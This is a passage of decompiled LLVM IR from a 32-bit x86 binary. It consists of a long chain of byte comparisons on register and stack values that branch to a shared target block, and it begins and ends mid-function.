  store i8 %v1_804e9f2, i8* %v4_804e9f2, align 1
  %v0_804e9f7 = load i32, i32* @esp, align 4
  %v1_804e9f7 = add i32 %v0_804e9f7, 76
  %v2_804e9f7 = inttoptr i32 %v1_804e9f7 to i8*
  %v3_804e9f7 = load i8, i8* %v2_804e9f7, align 1
  %v4_804e9f7 = icmp eq i8 %v3_804e9f7, 0
  br i1 %v4_804e9f7, label %dec_label_pc_804ea09, label %dec_label_pc_804e9fe

dec_label_pc_804e9fe:                             ; preds = %dec_label_pc_804e9ef
  %v1_804e9fe = add i32 %v0_804e9f7, 55
  %v2_804e9fe = inttoptr i32 %v1_804e9fe to i8*
  %v3_804e9fe = load i8, i8* %v2_804e9fe, align 1
  %v4_804e9fe = icmp eq i8 %v3_804e9fe, 0
  %v1_804ea03 = icmp eq i1 %v4_804e9fe, false
  br i1 %v1_804ea03, label %dec_label_pc_804e2d1, label %dec_label_pc_804ea09

dec_label_pc_804ea09:                             ; preds = %dec_label_pc_804e9fe, %dec_label_pc_804e9ef
  %v0_804ea09 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ea09 = trunc i32 %v0_804ea09 to i8
  %v11_804ea09 = icmp eq i8 %v1_804ea09, -78
  %v1_804ea0c = zext i1 %v11_804ea09 to i8
  %v3_804ea0c = add i32 %v0_804e9f7, 54
  %v4_804ea0c = inttoptr i32 %v3_804ea0c to i8*
  store i8 %v1_804ea0c, i8* %v4_804ea0c, align 1
  %v0_804ea11 = load i32, i32* @ebx, align 4
  %v1_804ea11 = trunc i32 %v0_804ea11 to i8
  %v10_804ea11 = icmp eq i8 %v1_804ea11, 62
  %v1_804ea14 = zext i1 %v10_804ea11 to i8
  %v2_804ea14 = load i32, i32* @esp, align 4
  %v3_804ea14 = add i32 %v2_804ea14, 53
  %v4_804ea14 = inttoptr i32 %v3_804ea14 to i8*
  store i8 %v1_804ea14, i8* %v4_804ea14, align 1
  %v0_804ea19 = load i32, i32* @esp, align 4
  %v1_804ea19 = add i32 %v0_804ea19, 54
  %v2_804ea19 = inttoptr i32 %v1_804ea19 to i8*
  %v3_804ea19 = load i8, i8* %v2_804ea19, align 1
  %v4_804ea19 = icmp eq i8 %v3_804ea19, 0
  br i1 %v4_804ea19, label %dec_label_pc_804ea2b, label %dec_label_pc_804ea20

dec_label_pc_804ea20:                             ; preds = %dec_label_pc_804ea09
  %v1_804ea20 = add i32 %v0_804ea19, 53
  %v2_804ea20 = inttoptr i32 %v1_804ea20 to i8*
  %v3_804ea20 = load i8, i8* %v2_804ea20, align 1
  %v4_804ea20 = icmp eq i8 %v3_804ea20, 0
  %v1_804ea25 = icmp eq i1 %v4_804ea20, false
  br i1 %v1_804ea25, label %dec_label_pc_804e2d1, label %dec_label_pc_804ea2b

dec_label_pc_804ea2b:                             ; preds = %dec_label_pc_804ea20, %dec_label_pc_804ea09
  %v1_804ea2b = add i32 %v0_804ea19, 57
  %v2_804ea2b = inttoptr i32 %v1_804ea2b to i8*
  %v3_804ea2b = load i8, i8* %v2_804ea2b, align 1
  %v4_804ea2b = icmp eq i8 %v3_804ea2b, 0
  br i1 %v4_804ea2b, label %dec_label_pc_804ea44, label %dec_label_pc_804ea32

dec_label_pc_804ea32:                             ; preds = %dec_label_pc_804ea2b
  %v0_804ea32 = load i32, i32* @ebx, align 4
  %v1_804ea32 = trunc i32 %v0_804ea32 to i8
  switch i8 %v1_804ea32, label %dec_label_pc_804ea44 [
    i8 -125, label %dec_label_pc_804e2d1
    i8 -20, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804ea44:                             ; preds = %dec_label_pc_804ea32, %dec_label_pc_804ea2b
  %v0_804ea44 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ea44 = trunc i32 %v0_804ea44 to i8
  %v10_804ea44 = icmp eq i8 %v1_804ea44, 107
  %v1_804ea47 = zext i1 %v10_804ea44 to i8
  %v3_804ea47 = add i32 %v0_804ea19, 52
  %v4_804ea47 = inttoptr i32 %v3_804ea47 to i8*
  store i8 %v1_804ea47, i8* %v4_804ea47, align 1
  %v0_804ea4c = load i32, i32* @ebx, align 4
  %v1_804ea4c = trunc i32 %v0_804ea4c to i8
  %v11_804ea4c = icmp eq i8 %v1_804ea4c, -86
  %v1_804ea4f = zext i1 %v11_804ea4c to i8
  %v2_804ea4f = load i32, i32* @esp, align 4
  %v3_804ea4f = add i32 %v2_804ea4f, 51
  %v4_804ea4f = inttoptr i32 %v3_804ea4f to i8*
  store i8 %v1_804ea4f, i8* %v4_804ea4f, align 1
  %v0_804ea54 = load i32, i32* @esp, align 4
  %v1_804ea54 = add i32 %v0_804ea54, 52
  %v2_804ea54 = inttoptr i32 %v1_804ea54 to i8*
  %v3_804ea54 = load i8, i8* %v2_804ea54, align 1
  %v4_804ea54 = icmp eq i8 %v3_804ea54, 0
  br i1 %v4_804ea54, label %dec_label_pc_804ea66, label %dec_label_pc_804ea5b

dec_label_pc_804ea5b:                             ; preds = %dec_label_pc_804ea44
  %v1_804ea5b = add i32 %v0_804ea54, 51
  %v2_804ea5b = inttoptr i32 %v1_804ea5b to i8*
  %v3_804ea5b = load i8, i8* %v2_804ea5b, align 1
  %v4_804ea5b = icmp eq i8 %v3_804ea5b, 0
  %v1_804ea60 = icmp eq i1 %v4_804ea5b, false
  br i1 %v1_804ea60, label %dec_label_pc_804e2d1, label %dec_label_pc_804ea66

dec_label_pc_804ea66:                             ; preds = %dec_label_pc_804ea5b, %dec_label_pc_804ea44
  %v1_804ea66 = add i32 %v0_804ea54, 64
  %v2_804ea66 = inttoptr i32 %v1_804ea66 to i8*
  %v3_804ea66 = load i8, i8* %v2_804ea66, align 1
  %v4_804ea66 = icmp eq i8 %v3_804ea66, 0
  br i1 %v4_804ea66, label %dec_label_pc_804ea76, label %dec_label_pc_804ea6d

dec_label_pc_804ea6d:                             ; preds = %dec_label_pc_804ea66
  %v0_804ea6d = load i32, i32* @ebx, align 4
  %v1_804ea6d = trunc i32 %v0_804ea6d to i8
  %v11_804ea6d = icmp eq i8 %v1_804ea6d, -59
  br i1 %v11_804ea6d, label %dec_label_pc_804e2d1, label %dec_label_pc_804ea76

dec_label_pc_804ea76:                             ; preds = %dec_label_pc_804ea6d, %dec_label_pc_804ea66
  %v1_804ea76 = add i32 %v0_804ea54, 81
  %v2_804ea76 = inttoptr i32 %v1_804ea76 to i8*
  %v3_804ea76 = load i8, i8* %v2_804ea76, align 1
  %v4_804ea76 = icmp ne i8 %v3_804ea76, 0
  %v1_804ea82 = icmp eq i1 %v4_804ea66, false
  %or.cond654 = and i1 %v4_804ea76, %v1_804ea82
  br i1 %or.cond654, label %dec_label_pc_804e2d1, label %dec_label_pc_804ea88

dec_label_pc_804ea88:                             ; preds = %dec_label_pc_804ea76
  %v1_804ea88 = add i32 %v0_804ea54, 79
  %v2_804ea88 = inttoptr i32 %v1_804ea88 to i8*
  %v3_804ea88 = load i8, i8* %v2_804ea88, align 1
  %v4_804ea88 = icmp eq i8 %v3_804ea88, 0
  br i1 %v4_804ea88, label %dec_label_pc_804ea9a, label %dec_label_pc_804ea8f

dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea88
  %v1_804ea8f = add i32 %v0_804ea54, 63
  %v2_804ea8f = inttoptr i32 %v1_804ea8f to i8*
  %v3_804ea8f = load i8, i8* %v2_804ea8f, align 1
  %v4_804ea8f = icmp eq i8 %v3_804ea8f, 0
  %v1_804ea94 = icmp eq i1 %v4_804ea8f, false
  br i1 %v1_804ea94, label %dec_label_pc_804e2d1, label %dec_label_pc_804ea9a

dec_label_pc_804ea9a:                             ; preds = %dec_label_pc_804ea8f, %dec_label_pc_804ea88
  %v1_804ea9a = add i32 %v0_804ea54, 98
  %v2_804ea9a = inttoptr i32 %v1_804ea9a to i8*
  %v3_804ea9a = load i8, i8* %v2_804ea9a, align 1
  %v0_804eaaa.pre = load i32, i32* @ebx, align 4
  %v1_804eaa1 = trunc i32 %v0_804eaaa.pre to i8
  %notlhs = icmp eq i8 %v3_804ea9a, 0
  %notrhs = icmp ne i8 %v1_804eaa1, -71
  %or.cond210.not = or i1 %notlhs, %notrhs
  %v7_8050583 = icmp slt i8 %v4_804e2e1, 0
  %v1_8050585 = icmp eq i1 %v7_8050583, false
  %or.cond293 = or i1 %v1_8050585, %or.cond210.not
  %or.cond293.not = xor i1 %or.cond293, true
  %tmp697 = icmp ult i8 %v4_804e2e1, -65
  %or.cond295 = and i1 %tmp697, %or.cond293.not
  br i1 %or.cond295, label %dec_label_pc_804e2d1, label %dec_label_pc_804eaaa

dec_label_pc_804eaaa:                             ; preds = %dec_label_pc_804ea9a
  %v10_804eaaa = icmp eq i8 %v1_804eaa1, 47
  %v1_804eaad = zext i1 %v10_804eaaa to i8
  %v3_804eaad = add i32 %v0_804ea54, 50
  %v4_804eaad = inttoptr i32 %v3_804eaad to i8*
  store i8 %v1_804eaad, i8* %v4_804eaad, align 1
  %v0_804eab2 = load i32, i32* @esp, align 4
  %v1_804eab2 = add i32 %v0_804eab2, 59
  %v2_804eab2 = inttoptr i32 %v1_804eab2 to i8*
  %v3_804eab2 = load i8, i8* %v2_804eab2, align 1
  %v4_804eab2 = icmp eq i8 %v3_804eab2, 0
  br i1 %v4_804eab2, label %dec_label_pc_804eace, label %dec_label_pc_804eab9

dec_label_pc_804eab9:                             ; preds = %dec_label_pc_804eaaa
  %v1_804eab9 = add i32 %v0_804eab2, 50
  %v2_804eab9 = inttoptr i32 %v1_804eab9 to i8*
  %v3_804eab9 = load i8, i8* %v2_804eab9, align 1
  %notlhs456 = icmp ne i8 %v3_804eab9, 0
  %v11_804eac5 = icmp eq i8 %v4_804e2e1, 10
  %tmp698 = and i1 %v11_804eac5, %notlhs456
  br i1 %tmp698, label %dec_label_pc_804e2d1, label %dec_label_pc_804eace

dec_label_pc_804eace:                             ; preds = %dec_label_pc_804eab9, %dec_label_pc_804eaaa
  %v0_804eace = load i32, i32* %ecx.global-to-local, align 4
  %v1_804eace = trunc i32 %v0_804eace to i8
  %v11_804eace = icmp eq i8 %v1_804eace, -82
  br i1 %v11_804eace, label %dec_label_pc_80505dd, label %dec_label_pc_804ead7

dec_label_pc_804ead7:                             ; preds = %dec_label_pc_80505dd, %dec_label_pc_804eace
  %v1_804ead7 = add i32 %v0_804eab2, 99
  %v2_804ead7 = inttoptr i32 %v1_804ead7 to i8*
  %v3_804ead7 = load i8, i8* %v2_804ead7, align 1
  %v4_804ead7 = icmp eq i8 %v3_804ead7, 0
  br i1 %v4_804ead7, label %dec_label_pc_804eae7, label %dec_label_pc_804eade

dec_label_pc_804eade:                             ; preds = %dec_label_pc_804ead7
  %v0_804eade = load i32, i32* @ebx, align 4
  %v1_804eade = trunc i32 %v0_804eade to i8
  %v11_804eade = icmp ne i8 %v1_804eade, -15
  %or.cond297 = or i1 %v1_8050585, %v11_804eade
  %or.cond297.not = xor i1 %or.cond297, true
  %v12_80505a1 = icmp eq i8 %v4_804e2e1, -1
  %v1_80505a4 = icmp eq i1 %v12_80505a1, false
  %or.cond299 = and i1 %v1_80505a4, %or.cond297.not
  br i1 %or.cond299, label %dec_label_pc_804e2d1, label %dec_label_pc_804eae7

dec_label_pc_804eae7:                             ; preds = %dec_label_pc_804eade, %dec_label_pc_804ead7
  %v1_804eae7 = add i32 %v0_804eab2, 66
  %v2_804eae7 = inttoptr i32 %v1_804eae7 to i8*
  %v3_804eae7 = load i8, i8* %v2_804eae7, align 1
  %v4_804eae7 = icmp eq i8 %v3_804eae7, 0
  br i1 %v4_804eae7, label %dec_label_pc_804eb07, label %dec_label_pc_804eaee

dec_label_pc_804eaee:                             ; preds = %dec_label_pc_804eae7
  %v0_804eaee = load i32, i32* @ebx, align 4
  %v1_804eaee = trunc i32 %v0_804eaee to i8
  %notlhs458 = icmp eq i8 %v1_804eaee, -57
  %v4_804e2e1.off460 = add i8 %v4_804e2e1, -64
  %tmp699 = icmp ult i8 %v4_804e2e1.off460, 63
  %tmp700 = and i1 %tmp699, %notlhs458
  br i1 %tmp700, label %dec_label_pc_804e2d1, label %dec_label_pc_804eaf7

dec_label_pc_804eaf7:                             ; preds = %dec_label_pc_804eaee
  %notlhs461 = icmp eq i8 %v1_804eaee, -45
  %v4_804e2e1.off463 = add i8 %v4_804e2e1, -96
  %tmp701 = icmp ult i8 %v4_804e2e1.off463, 31
  %tmp702 = and i1 %tmp701, %notlhs461
  br i1 %tmp702, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb07

dec_label_pc_804eb07:                             ; preds = %dec_label_pc_804eaf7, %dec_label_pc_804eae7
  %v1_804eb07 = add i32 %v0_804eab2, 95
  %v2_804eb07 = inttoptr i32 %v1_804eb07 to i8*
  %v3_804eb07 = load i8, i8* %v2_804eb07, align 1
  %v4_804eb07 = icmp eq i8 %v3_804eb07, 0
  br i1 %v4_804eb07, label %dec_label_pc_804eb23, label %dec_label_pc_804eb0e

dec_label_pc_804eb0e:                             ; preds = %dec_label_pc_804eb07
  %v1_804eb0e = add i32 %v0_804eab2, 77
  %v2_804eb0e = inttoptr i32 %v1_804eb0e to i8*
  %v3_804eb0e = load i8, i8* %v2_804eb0e, align 1
  %notlhs464 = icmp ne i8 %v3_804eb0e, 0
  %notrhs465 = icmp ugt i8 %v4_804e2e1, -65
  %or.cond214.not = and i1 %notrhs465, %notlhs464
  %v12_804eb1a = icmp eq i8 %v4_804e2e1, -1
  %v1_804eb1d = icmp eq i1 %v12_804eb1a, false
  %or.cond215 = and i1 %v1_804eb1d, %or.cond214.not
  br i1 %or.cond215, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb23

dec_label_pc_804eb23:                             ; preds = %dec_label_pc_804eb0e, %dec_label_pc_804eb07
  %v10_804eb23 = icmp eq i8 %v1_804eace, 37
  %v1_804eb26 = zext i1 %v10_804eb23 to i8
  %v3_804eb26 = add i32 %v0_804eab2, 49
  %v4_804eb26 = inttoptr i32 %v3_804eb26 to i8*
  store i8 %v1_804eb26, i8* %v4_804eb26, align 1
  %v0_804eb2b = load i32, i32* @esp, align 4
  %v1_804eb2b = add i32 %v0_804eb2b, 49
  %v2_804eb2b = inttoptr i32 %v1_804eb2b to i8*
  %v3_804eb2b = load i8, i8* %v2_804eb2b, align 1
  %v4_804eb2b = icmp eq i8 %v3_804eb2b, 0
  br i1 %v4_804eb2b, label %dec_label_pc_804eb3b, label %dec_label_pc_804eb32

dec_label_pc_804eb32:                             ; preds = %dec_label_pc_804eb23
  %v0_804eb32 = load i32, i32* @ebx, align 4
  %v1_804eb32 = trunc i32 %v0_804eb32 to i8
  %notlhs466 = icmp eq i8 %v1_804eb32, -117
  %v4_804e2e1.off468 = add i8 %v4_804e2e1, -1
  %tmp703 = icmp ult i8 %v4_804e2e1.off468, 30
  %tmp704 = and i1 %tmp703, %notlhs466
  br i1 %tmp704, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb3b

dec_label_pc_804eb3b:                             ; preds = %dec_label_pc_804eb32, %dec_label_pc_804eb23
  %v0_804eb3b = load i32, i32* %ecx.global-to-local, align 4
  %v1_804eb3b = trunc i32 %v0_804eb3b to i8
  %v10_804eb3b = icmp eq i8 %v1_804eb3b, 67
  %v1_804eb3e = zext i1 %v10_804eb3b to i32
  %v2_804eb3e = load i32, i32* %eax.global-to-local, align 4
  %v3_804eb3e = and i32 %v2_804eb3e, -256
  %v4_804eb3e = or i32 %v1_804eb3e, %v3_804eb3e
  store i32 %v4_804eb3e, i32* %eax.global-to-local, align 4
  %v4_804eb41 = icmp eq i1 %v10_804eb3b, false
  br i1 %v4_804eb41, label %dec_label_pc_804eb5b, label %dec_label_pc_804eb45

dec_label_pc_804eb45:                             ; preds = %dec_label_pc_804eb3b
  %v0_804eb45 = load i32, i32* @ebx, align 4
  %v1_804eb45 = trunc i32 %v0_804eb45 to i8
  switch i8 %v1_804eb45, label %dec_label_pc_804eb5b [
    i8 -49, label %dec_label_pc_8050628
    i8 -51, label %dec_label_pc_8050612
  ]

dec_label_pc_804eb5b:                             ; preds = %dec_label_pc_8050628, %dec_label_pc_8050612, %dec_label_pc_804eb45, %dec_label_pc_804eb3b
  %v1_804eb5b = add i32 %v0_804eb2b, 74
  %v2_804eb5b = inttoptr i32 %v1_804eb5b to i8*
  %v3_804eb5b = load i8, i8* %v2_804eb5b, align 1
  %v4_804eb5b = icmp eq i8 %v3_804eb5b, 0
  br i1 %v4_804eb5b, label %dec_label_pc_804eb6b, label %dec_label_pc_804eb62

dec_label_pc_804eb62:                             ; preds = %dec_label_pc_804eb5b
  %v0_804eb62 = load i32, i32* @ebx, align 4
  %v1_804eb62 = trunc i32 %v0_804eb62 to i8
  %v8_804eb62 = icmp ne i8 %v1_804eb62, -16
  %or.cond322 = or i1 %v1_8050585, %v8_804eb62
  %or.cond322.not = xor i1 %or.cond322, true
  %tmp705 = icmp ult i8 %v4_804e2e1, -113
  %or.cond324 = and i1 %tmp705, %or.cond322.not
  br i1 %or.cond324, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb6b

dec_label_pc_804eb6b:                             ; preds = %dec_label_pc_804eb62, %dec_label_pc_804eb5b
  %v1_804eb6b = add i32 %v0_804eb2b, 91
  %v2_804eb6b = inttoptr i32 %v1_804eb6b to i8*
  %v3_804eb6b = load i8, i8* %v2_804eb6b, align 1
  %notlhs469 = icmp eq i8 %v3_804eb6b, 0
  %notrhs470 = icmp ne i8 %v1_804eb3b, 82
  %or.cond216.not = or i1 %notrhs470, %notlhs469
  %v6_8050655 = icmp eq i8 %v4_804e2e1, 0
  %or.cond325 = or i1 %v6_8050655, %or.cond216.not
  %or.cond325.not = xor i1 %or.cond325, true
  %tmp706 = icmp ult i8 %v4_804e2e1, 15
  %or.cond327 = and i1 %tmp706, %or.cond325.not
  br i1 %or.cond327, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb7b

dec_label_pc_804eb7b:                             ; preds = %dec_label_pc_804eb6b
  %v1_804eb7b = add i32 %v0_804eb2b, 80
  %v2_804eb7b = inttoptr i32 %v1_804eb7b to i8*
  %v3_804eb7b = load i8, i8* %v2_804eb7b, align 1
  %notlhs471 = icmp eq i8 %v3_804eb7b, 0
  %notrhs472 = icmp ne i8 %v1_804eb3b, 95
  %or.cond217.not = or i1 %notrhs472, %notlhs471
  %tmp707 = icmp ult i8 %v4_804e2e1, 8
  %or.cond361 = or i1 %tmp707, %or.cond217.not
  %or.cond361.not = xor i1 %or.cond361, true
  %tmp708 = icmp ult i8 %v4_804e2e1, 63
  %or.cond363 = and i1 %tmp708, %or.cond361.not
  br i1 %or.cond363, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb8b

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eb7b
  %v0_804eb8b = load i32, i32* @ebx, align 4
  %v1_804eb8b = trunc i32 %v0_804eb8b to i8
  %v11_804eb8b = icmp eq i8 %v1_804eb8b, -19
  %v1_804eb8e = zext i1 %v11_804eb8b to i8
  %v3_804eb8e = add i32 %v0_804eb2b, 48
  %v4_804eb8e = inttoptr i32 %v3_804eb8e to i8*
  store i8 %v1_804eb8e, i8* %v4_804eb8e, align 1
  %v0_804eb93 = load i32, i32* @esp, align 4
  %v1_804eb93 = add i32 %v0_804eb93, 72
  %v2_804eb93 = inttoptr i32 %v1_804eb93 to i8*
  %v3_804eb93 = load i8, i8* %v2_804eb93, align 1
  %v4_804eb93 = icmp eq i8 %v3_804eb93, 0
  br i1 %v4_804eb93, label %dec_label_pc_804ebaf, label %dec_label_pc_804eb9a

dec_label_pc_804eb9a:                             ; preds = %dec_label_pc_804eb8b
  %v1_804eb9a = add i32 %v0_804eb93, 48
  %v2_804eb9a = inttoptr i32 %v1_804eb9a to i8*
  %v3_804eb9a = load i8, i8* %v2_804eb9a, align 1
  %notlhs473 = icmp ne i8 %v3_804eb9a, 0
  %v4_804e2e1.off475 = add i8 %v4_804e2e1, -32
  %tmp709 = icmp ult i8 %v4_804e2e1.off475, 11
  %tmp710 = and i1 %tmp709, %notlhs473
  br i1 %tmp710, label %dec_label_pc_804e2d1, label %dec_label_pc_804ebaf

dec_label_pc_804ebaf:                             ; preds = %dec_label_pc_804eb9a, %dec_label_pc_804eb8b
  %v0_804ebaf = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ebaf = trunc i32 %v0_804ebaf to i8
  %v11_804ebaf = icmp eq i8 %v1_804ebaf, -71
  %v1_804ebb2 = zext i1 %v11_804ebaf to i32
  %v2_804ebb2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ebb2 = and i32 %v2_804ebb2, -256
  %v4_804ebb2 = or i32 %v1_804ebb2, %v3_804ebb2
  store i32 %v4_804ebb2, i32* %eax.global-to-local, align 4
  %v4_804ebb5 = icmp eq i1 %v11_804ebaf, false
  br i1 %v4_804ebb5, label %dec_label_pc_804ebc2, label %dec_label_pc_804ebb9

dec_label_pc_804ebb9:                             ; preds = %dec_label_pc_804ebaf
  %v0_804ebb9 = load i32, i32* @ebx, align 4
  %v1_804ebb9 = trunc i32 %v0_804ebb9 to i8
  %notlhs476 = icmp eq i8 %v1_804ebb9, 92
  %v4_804e2e1.off478 = add i8 %v4_804e2e1, 36
  %tmp711 = icmp ult i8 %v4_804e2e1.off478, 3
  %tmp712 = and i1 %tmp711, %notlhs476
  br i1 %tmp712, label %dec_label_pc_804e2d1, label %dec_label_pc_804ebc2

dec_label_pc_804ebc2:                             ; preds = %dec_label_pc_804ebb9, %dec_label_pc_804ebaf
  %v1_804ebc2 = add i32 %v0_804eb93, 57
  %v2_804ebc2 = inttoptr i32 %v1_804ebc2 to i8*
  %v3_804ebc2 = load i8, i8* %v2_804ebc2, align 1
  %v4_804ebc2 = icmp eq i8 %v3_804ebc2, 0
  br i1 %v4_804ebc2, label %dec_label_pc_804ebd2, label %dec_label_pc_804ebc9

dec_label_pc_804ebc9:                             ; preds = %dec_label_pc_804ebc2
  %v0_804ebc9 = load i32, i32* @ebx, align 4
  %v1_804ebc9 = trunc i32 %v0_804ebc9 to i8
  %v11_804ebc9 = icmp ne i8 %v1_804ebc9, -18
  %or.cond369 = or i1 %v1_8050585, %v11_804ebc9
  %or.cond369.not = xor i1 %or.cond369, true
  %or.cond371 = and i1 %tmp697, %or.cond369.not
  br i1 %or.cond371, label %dec_label_pc_804e2d1, label %dec_label_pc_804ebd2

dec_label_pc_804ebd2:                             ; preds = %dec_label_pc_804ebc9, %dec_label_pc_804ebc2
  %v1_804ebd2 = add i32 %v0_804eb93, 73
  %v2_804ebd2 = inttoptr i32 %v1_804ebd2 to i8*
  %v3_804ebd2 = load i8, i8* %v2_804ebd2, align 1
  %v4_804ebd2 = icmp eq i8 %v3_804ebd2, 0
  br i1 %v4_804ebd2, label %dec_label_pc_804ebe2, label %dec_label_pc_804ebd9

dec_label_pc_804ebd9:                             ; preds = %dec_label_pc_804ebd2
  %v0_804ebd9 = load i32, i32* @ebx, align 4
  %v1_804ebd9 = trunc i32 %v0_804ebd9 to i8
  %v11_804ebd9 = icmp ne i8 %v1_804ebd9, -34
  %or.cond372 = or i1 %v6_8050655, %v11_804ebd9
  %or.cond372.not = xor i1 %or.cond372, true
  %tmp713 = icmp ult i8 %v4_804e2e1, 31
  %or.cond374 = and i1 %tmp713, %or.cond372.not
  br i1 %or.cond374, label %dec_label_pc_804e2d1, label %dec_label_pc_804ebe2

dec_label_pc_804ebe2:                             ; preds = %dec_label_pc_804ebd9, %dec_label_pc_804ebd2
  %v8_804ebe2 = icmp eq i8 %v1_804ebaf, -48
  %v1_804ebe5 = zext i1 %v8_804ebe2 to i8
  %v3_804ebe5 = add i32 %v0_804eb93, 47
  %v4_804ebe5 = inttoptr i32 %v3_804ebe5 to i8*
  store i8 %v1_804ebe5, i8* %v4_804ebe5, align 1
  %v0_804ebea = load i32, i32* @esp, align 4
  %v1_804ebea = add i32 %v0_804ebea, 47
  %v2_804ebea = inttoptr i32 %v1_804ebea to i8*
  %v3_804ebea = load i8, i8* %v2_804ebea, align 1
  %v4_804ebea = icmp eq i8 %v3_804ebea, 0
  br i1 %v4_804ebea, label %dec_label_pc_804ebfa, label %dec_label_pc_804ebf1

dec_label_pc_804ebf1:                             ; preds = %dec_label_pc_804ebe2
  %v0_804ebf1 = load i32, i32* @ebx, align 4
  %v1_804ebf1 = trunc i32 %v0_804ebf1 to i8
  %notlhs479 = icmp eq i8 %v1_804ebf1, -89
  %v4_804e2e1.off481 = add i8 %v4_804e2e1, 24
  %tmp714 = icmp ult i8 %v4_804e2e1.off481, 20
  %tmp715 = and i1 %tmp714, %notlhs479
  br i1 %tmp715, label %dec_label_pc_804e2d1, label %dec_label_pc_804ebfa

dec_label_pc_804ebfa:                             ; preds = %dec_label_pc_804ebf1, %dec_label_pc_804ebe2
  %v0_804ebfa = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ebfa = trunc i32 %v0_804ebfa to i8
  %v10_804ebfa = icmp eq i8 %v1_804ebfa, 66
  %v1_804ebfd = zext i1 %v10_804ebfa to i8
  %v3_804ebfd = add i32 %v0_804ebea, 46
  %v4_804ebfd = inttoptr i32 %v3_804ebfd to i8*
  store i8 %v1_804ebfd, i8* %v4_804ebfd, align 1
  %v0_804ec02 = load i32, i32* @esp, align 4
  %v1_804ec02 = add i32 %v0_804ec02, 76
  %v2_804ec02 = inttoptr i32 %v1_804ec02 to i8*
  %v3_804ec02 = load i8, i8* %v2_804ec02, align 1
  %v4_804ec02 = icmp eq i8 %v3_804ec02, 0
  br i1 %v4_804ec02, label %dec_label_pc_804ec18, label %dec_label_pc_804ec09

dec_label_pc_804ec09:                             ; preds = %dec_label_pc_804ebfa
  %v1_804ec09 = add i32 %v0_804ec02, 46
  %v2_804ec09 = inttoptr i32 %v1_804ec09 to i8*
  %v3_804ec09 = load i8, i8* %v2_804ec09, align 1
  %v4_804ec09 = icmp ne i8 %v3_804ec09, 0
  %or.cond220 = and i1 %v7_8050583, %v4_804ec09
  %tmp716 = icmp ult i8 %v4_804e2e1, -97
  %or.cond380 = and i1 %tmp716, %or.cond220
  br i1 %or.cond380, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec18

dec_label_pc_804ec18:                             ; preds = %dec_label_pc_804ec09, %dec_label_pc_804ebfa
  %v1_804ec18 = add i32 %v0_804ec02, 55
  %v2_804ec18 = inttoptr i32 %v1_804ec18 to i8*
  %v3_804ec18 = load i8, i8* %v2_804ec18, align 1
  %v4_804ec18 = icmp eq i8 %v3_804ec18, 0
  br i1 %v4_804ec18, label %dec_label_pc_804ec28, label %dec_label_pc_804ec1f

dec_label_pc_804ec1f:                             ; preds = %dec_label_pc_804ec18
  %v0_804ec1f = load i32, i32* @ebx, align 4
  %v1_804ec1f = trunc i32 %v0_804ec1f to i8
  %v10_804ec1f = icmp ne i8 %v1_804ec1f, 63
  %or.cond381 = or i1 %v6_8050655, %v10_804ec1f
  %or.cond381.not = xor i1 %or.cond381, true
  %tmp717 = icmp ult i8 %v4_804e2e1, 127
  %or.cond383 = and i1 %tmp717, %or.cond381.not
  br i1 %or.cond383, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec28

dec_label_pc_804ec28:                             ; preds = %dec_label_pc_804ec1f, %dec_label_pc_804ec18
  %v1_804ec28 = add i32 %v0_804ec02, 48
  %v2_804ec28 = inttoptr i32 %v1_804ec28 to i8*
  %v3_804ec28 = load i8, i8* %v2_804ec28, align 1
  %v4_804ec28 = icmp eq i8 %v3_804ec28, 0
  br i1 %v4_804ec28, label %dec_label_pc_804ec38, label %dec_label_pc_804ec2f

dec_label_pc_804ec2f:                             ; preds = %dec_label_pc_804ec28
  %v0_804ec2f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ec2f = trunc i32 %v0_804ec2f to i8
  %v11_804ec2f = icmp ne i8 %v1_804ec2f, -40
  %or.cond385 = or i1 %v1_8050585, %v11_804ec2f
  %or.cond385.not = xor i1 %or.cond385, true
  %tmp718 = icmp ult i8 %v4_804e2e1, -97
  %or.cond387 = and i1 %tmp718, %or.cond385.not
  br i1 %or.cond387, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec38

dec_label_pc_804ec38:                             ; preds = %dec_label_pc_804ec2f, %dec_label_pc_804ec28
  %v0_804ec38 = load i32, i32* @ebx, align 4
  %v1_804ec38 = trunc i32 %v0_804ec38 to i8
  %v10_804ec38 = icmp eq i8 %v1_804ec38, 61
  %v1_804ec3b = zext i1 %v10_804ec38 to i8
  %v3_804ec3b = add i32 %v0_804ec02, 45
  %v4_804ec3b = inttoptr i32 %v3_804ec3b to i8*
  store i8 %v1_804ec3b, i8* %v4_804ec3b, align 1
  %v0_804ec40 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ec40 = trunc i32 %v0_804ec40 to i8
  %v10_804ec40 = icmp eq i8 %v1_804ec40, 108
  %v0_80506d0 = load i32, i32* @esp, align 4
  br i1 %v10_804ec40, label %dec_label_pc_80506d0, label %dec_label_pc_804ec49

dec_label_pc_804ec49:                             ; preds = %dec_label_pc_804ec38, %dec_label_pc_80506d0
  %v1_804ec49 = add i32 %v0_80506d0, 55
  %v2_804ec49 = inttoptr i32 %v1_804ec49 to i8*
  %v3_804ec49 = load i8, i8* %v2_804ec49, align 1
  %v4_804ec49 = icmp eq i8 %v3_804ec49, 0
  br i1 %v4_804ec49, label %dec_label_pc_804ec59, label %dec_label_pc_804ec50

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804ec49
  %v0_804ec50 = load i32, i32* @ebx, align 4
  %v1_804ec50 = trunc i32 %v0_804ec50 to i8
  %v10_804ec50 = icmp eq i8 %v1_804ec50, 76
  br i1 %v10_804ec50, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec59

